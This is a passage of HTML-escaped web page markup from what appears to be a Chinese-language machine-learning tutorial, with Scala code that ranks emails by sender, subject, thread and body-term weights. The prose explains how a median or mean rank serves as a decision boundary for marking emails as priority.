&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;commonTermsWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;termsInMailBody&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tdm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-52&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-53&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;termWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;threadGroupWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;commonTermsWeight *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;senderWeight&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-61&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedTrainingRanks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingRanks&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;median&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortedTrainingRanks&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedTrainingRanks&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-65&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mean&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sortedTrainingRanks&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-67&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedTrainingRanks&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0094 seconds] --&gt;
&lt;p&gt;我们计算了训练集中所有邮件的排序，还将它们做了排序并取中位数和平均值。我们取中位数和平均值是为了确定一个&lt;strong&gt;决策边界&lt;/strong&gt;，通过该边界来评估一封邮件是优先级还是非优先级。在实践中，这个办法通常并不管用。实际上最好的办法是让用户标记一组邮件作为优先级，与另一组邮件作为非优先级。然后就可以用这些邮件的排序来计算出决策边界，此外还可以确认排序系统的特征是否选得正确。如果最终用户标记为非优先级的邮件评级比标记为优先级的邮件还高，那你可能要重新评估你所选取的特征。&lt;/p&gt;
&lt;p&gt;我们之所以提出这个决策边界，而不是仅仅对用户邮件进行排序，是考虑了时间这个因素。如果你纯粹根据排序来整理邮件，那结果将会令人讨厌，因为人们通常喜欢根据时间来整理邮件。然而，假设我们要把这一排序系统融合到一个邮件客户端中，有了这个决策边界之后，我们就可以标记优先级邮件，然后把它们单独显示在一个列表中。&lt;/p&gt;
&lt;p&gt;我们来看看在训练集中，有多少封邮件被标记为优先级。为此，我们首先需要添加下列代码：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061386088506113&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
  val testingRanks = trainingData.map(mail =&amp;gt; {
      //mail contains (full content, date, sender, subject, body)
      //包含（全部内容、日期、发送人、主题、正文）的邮件

      //Determine the weight of the sender
      //确定发送人的权重
      val senderWeight = mailsGroupedBySender
        .collectFirst { case (mail.sender, x) =&amp;gt;  Math.max(x,1)}
        .getOrElse(1.0)

      //Determine the weight of the subject
      //确定主题的权重
      val termsInSubject = mail.subject
        .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
        .toLowerCase.split(&quot; &quot;)
        .filter(x =&amp;gt;    x.nonEmpty &amp;amp;&amp;amp;
        !stopWords.contains(x)
        )

      val termWeight = if (termsInSubject.size &amp;gt; 0)
        Math.max(termsInSubject
        .map(x =&amp;gt; {
        tdm.collectFirst { case (y, z) if y == x =&amp;gt; z}
          .getOrElse(1.0)
      })
        .sum / termsInSubject.length,1)
      else 1.0

      //Determine if the email is from a thread,
      //and if it is the weight from this thread:
      //判断一封邮件是否来自一个会话，如果是，其在该会话的权重:
      val threadGroupWeight: Double = threadGroupedWithWeights
        .collectFirst { case (mail.subject, _, _, weight) =&amp;gt; weight}
        .getOrElse(1.0)

      //Determine the commonly used terms in the email and the weight belonging to it:
      //确定邮件中的常用词汇及其权重:
      val termsInMailBody = mail.body
        .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
        .toLowerCase.split(&quot; &quot;)
        .filter(x =&amp;gt;    x.nonEmpty &amp;amp;&amp;amp;
        !stopWords.contains(x)
        )

      val commonTermsWeight = if (termsInMailBody.size &amp;gt; 0)
        Math.max(termsInMailBody
        .map(x =&amp;gt; {
        tdm.collectFirst { case (y, z) if y == x =&amp;gt; z}
          .getOrElse(1.0)
      })
        .sum / termsInMailBody.length,1)
      else 1.0

      val rank =    termWeight *
        threadGroupWeight *
        commonTermsWeight *
        senderWeight

      (mail, rank)
    })


    val priorityEmails = testingRanks
        .filter(x =&amp;gt; x._2 &amp;gt;= mean)

    println(priorityEmails.length + &quot; ranked as priority&quot;)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-60&quot;&gt;60&lt;/div&gt;
